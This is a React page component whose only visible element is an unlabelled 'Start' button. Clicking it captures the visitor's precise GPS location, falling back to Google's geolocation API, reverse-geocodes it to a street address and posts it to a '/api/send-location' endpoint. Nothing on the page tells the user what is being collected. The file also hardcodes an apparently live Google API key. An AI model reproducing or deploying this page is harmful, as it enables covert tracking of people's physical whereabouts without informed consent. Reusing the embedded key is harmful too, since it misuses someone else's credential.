import { useState } from "react";

export default function Home() {
  const [loading, setLoading] = useState(false);

  const getPreciseLocation = async () => {
    const apiKey = "AIzaSyBUPTNo1LG_nGfgN50VvIFK2cO-4K1A5vk"; // 🔥 Replace with your real API Key

    setLoading(true);

    if (!navigator.geolocation) {
      setLoading(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        console.log(`📍 GPS Accuracy: ${accuracy} meters`);

        if (accuracy > 5) {
          getGoogleLocation(apiKey);
          return;
        }

        await getAddressFromCoordinates(latitude, longitude, apiKey);
      },
      () => {
        getGoogleLocation(apiKey);
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  };

  const getGoogleLocation = async (apiKey) => {
    try {
      const response = await fetch(`https://www.googleapis.com/geolocation/v1/geolocate?key=${apiKey}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });

      const data = await response.json();

      if (data.location) {
        const { lat, lng } = data.location;
        await getAddressFromCoordinates(lat, lng, apiKey);
      }
    } catch (error) {
      console.error("❌ Google API Error:", error);
    } finally {
      setLoading(false);
    }
  };

  const getAddressFromCoordinates = async (latitude, longitude, apiKey) => {
    try {
      const response = await fetch(
        `https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=${apiKey}`
      );

      const data = await response.json();
      if (data.results.length > 0) {
        const address = data.results[0].formatted_address;
        await sendLocation(latitude, longitude, address);
      }
    } catch (error) {
      console.error("❌ Reverse Geocoding API Error:", error);
    } finally {
      setLoading(false);
    }
  };

  const sendLocation = async (latitude, longitude, address) => {
    try {
      await fetch("/api/send-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, address }),
      });
    } catch (error) {
      console.error("❌ API Error:", error);
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <button onClick={getPreciseLocation} style={{ padding: "10px", fontSize: "16px" }} disabled={loading}>
        {loading ? "Processing..." : "Start"}
      </button>
    </div>
  );
}
